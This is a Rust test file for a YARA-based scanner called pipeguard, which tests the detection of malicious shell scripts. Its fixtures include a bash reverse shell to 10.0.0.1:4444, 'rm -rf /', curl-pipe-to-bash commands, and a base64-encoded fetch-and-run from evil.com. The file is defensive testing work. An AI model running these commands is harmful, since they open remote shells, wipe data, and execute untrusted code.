use pipeguard::detection::scanner::YaraScanner;
use pipeguard::detection::threat::ThreatLevel;
use std::fs;
use tempfile::TempDir;

#[test]
fn scanner_loads_rules_from_string() {
    let rule = r#"
        rule test_rule : test {
            meta:
                severity = 5
                description = "Test rule"
            strings:
                $a = "malicious"
            condition:
                $a
        }
    "#;

    let scanner = YaraScanner::from_source(rule).expect("Failed to compile rule");
    assert!(scanner.rule_count() > 0);
}

#[test]
fn scanner_loads_rules_from_file() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = temp_dir.path().join("test.yar");

    let rule = r#"
        rule file_rule {
            meta:
                severity = 7
                description = "Rule from file"
            strings:
                $a = "dangerous"
            condition:
                $a
        }
    "#;
    fs::write(&rule_path, rule).unwrap();

    let scanner = YaraScanner::from_file(&rule_path).expect("Failed to load rule file");
    assert!(scanner.rule_count() > 0);
}

#[test]
fn scanner_detects_matching_content() {
    let rule = r#"
        rule reverse_shell {
            meta:
                severity = 10
                description = "Reverse shell pattern detected"
            strings:
                $bash_i = "bash -i"
                $dev_tcp = "/dev/tcp/"
            condition:
                $bash_i and $dev_tcp
        }
    "#;

    let scanner = YaraScanner::from_source(rule).unwrap();
    let malicious_script = r#"
        #!/bin/bash
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    "#;

    let result = scanner.scan(malicious_script).unwrap();
    assert!(result.has_matches());
    assert_eq!(result.threat_level(), ThreatLevel::High);
}

#[test]
fn scanner_returns_no_matches_for_clean_content() {
    let rule = r#"
        rule evil_pattern {
            meta:
                severity = 8
                description = "Evil detected"
            strings:
                $evil = "rm -rf /"
            condition:
                $evil
        }
    "#;

    let scanner = YaraScanner::from_source(rule).unwrap();
    let clean_script = "echo 'Hello, World!'";

    let result = scanner.scan(clean_script).unwrap();
    assert!(!result.has_matches());
    assert_eq!(result.threat_level(), ThreatLevel::None);
}

#[test]
fn scanner_extracts_metadata_from_matches() {
    let rule = r#"
        rule base64_encoded {
            meta:
                severity = 5
                description = "Base64 encoded payload"
            strings:
                $b64 = /[A-Za-z0-9+\/]{50,}={0,2}/
            condition:
                $b64
        }
    "#;

    let scanner = YaraScanner::from_source(rule).unwrap();
    let script = "eval $(echo 'Y3VybCBodHRwczovL2V2aWwuY29tL3NjcmlwdC5zaCB8IGJhc2g=' | base64 -d)";

    let result = scanner.scan(script).unwrap();
    assert!(result.has_matches());

    let matches = result.matches();
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].rule_name(), "base64_encoded");
    assert_eq!(matches[0].severity(), 5);
    assert!(matches[0].description().contains("Base64"));
}

#[test]
fn scanner_handles_multiple_matching_rules() {
    let rules = r#"
        rule obfuscation {
            meta:
                severity = 5
                description = "Obfuscation detected"
            strings:
                $eval = "eval"
            condition:
                $eval
        }

        rule download_exec {
            meta:
                severity = 8
                description = "Download and execute pattern"
            strings:
                $curl = "curl"
                $bash = "bash"
            condition:
                $curl and $bash
        }
    "#;

    let scanner = YaraScanner::from_source(rules).unwrap();
    let script = "eval $(curl https://example.com/script.sh | bash)";

    let result = scanner.scan(script).unwrap();
    assert!(result.has_matches());
    assert_eq!(result.matches().len(), 2);
    // Threat level should be based on highest severity (8)
    assert_eq!(result.threat_level(), ThreatLevel::Medium);
}

#[test]
fn scanner_invalid_rule_returns_error() {
    let bad_rule = "this is not a valid yara rule {{{";
    let result = YaraScanner::from_source(bad_rule);
    assert!(result.is_err());
}
